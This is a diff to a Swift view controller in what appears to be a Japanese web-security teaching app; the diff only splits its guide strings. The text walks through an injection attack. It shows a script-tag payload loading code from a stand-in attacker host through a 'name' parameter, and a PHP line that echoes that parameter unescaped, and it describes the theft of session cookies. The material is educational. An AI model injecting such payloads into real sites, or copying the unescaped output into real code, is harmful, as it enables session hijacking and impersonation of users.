@@ -72,7 +72,8 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
     private func guide1_1() {
         endGuideHandler = guide1_2
     appendGuideText("この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。", programingLanguages: nil)
-        appendGuideText("脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには<script src=http://www.trap.cp.jp/iframe_injection.js></script>が設定されています。\nこのnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。", programingLanguages: .html)
+        appendGuideText("脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには<script src=http://www.trap.cp.jp/iframe_injection.js></script>が設定されています。", programingLanguages: .html)
+        appendGuideText("このnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。", programingLanguages: nil)
         appendGuideText("それでは実際にこのリンクをタップして脆弱なWebサイトに遷移してみましょう。", programingLanguages: nil)
         setGuideText()
         focus(on: trapButton)
@@ -96,7 +97,7 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
     private func guide2_1() {
         endGuideHandler = guide2_2
         appendGuideText("この赤枠で囲まれた<p>タグには本来以下のコードでユーザの名前を表示しようとしていました。\n<p><?php echo $_GET[\"name\"]; ?>さん</p>\nしかし、実際には<p>タグの下に示したコードが実行されました。", programingLanguages: .html, .php)
-        appendGuideText("nameに設定された値をエスケープせずに表示した結果、「<p><?php echo $_GET[\"name\"]; ?>さん</p>」は、「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」と解釈され攻撃者の用意したスクリプトが実行されてしまいました。", programingLanguages: .php, .html)
+        appendGuideText("nameに設定された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。", programingLanguages: .php, .html)
         setGuideText()
         focus(on: nameLabel)
     }
@@ -112,7 +113,8 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
     private func guide2_3() {
         endGuideHandler = guide2_4
     appendGuideText("ここに攻撃者が取得したユーザのクッキーの値が表示されています。\n脆弱なWebサイトで生成したユーザのセッションIDが盗まれてしまっています。", programingLanguages: nil)
-    appendGuideText("セッションIDが盗まれると攻撃者がユーザになりすますことが可能となってしまいます。\nユーザになりすましてサービスを利用されてしまってはユーザが不利益を被ることになりますし、サービスへの信頼も失ってしまいます。\n他にもCookieからユーザの様々な個人情報が盗まれてしまうため、早急に対策する必要があります。", programingLanguages: nil)
+    appendGuideText("セッションIDが盗まれると攻撃者がユーザになりすますことが可能となってしまいます。\nユーザになりすましてサービスを利用されてしまってはユーザが不利益を被ることになりますし、サービスへの信頼も失ってしまいます。", programingLanguages: nil)
+        appendGuideText("他にもCookieからユーザの様々な個人情報が盗まれてしまうため、早急に対策する必要があります。", programingLanguages: nil)
         setGuideText()
         unfocus(elementView: feedbackIFrame)
         focus(on: sessIdLabel)
